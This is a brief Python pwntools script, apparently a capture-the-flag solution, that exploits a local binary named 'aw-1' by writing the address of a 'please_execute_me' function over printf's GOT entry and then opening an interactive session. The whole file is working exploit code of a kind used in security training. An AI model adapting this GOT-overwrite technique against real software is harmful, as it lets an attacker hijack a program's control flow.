#!/usr/bin/env python

from pwn import *

p = process("./aw-1")

printf_got = p.elf.got['printf']
target_address = p.elf.symbols['please_execute_me']

print(p.recv())

p.sendline("6")

print(p.recv())

p.sendline(hex(printf_got))

print(p.recv())

p.send(p64(target_address)[0:6])

p.interactive()
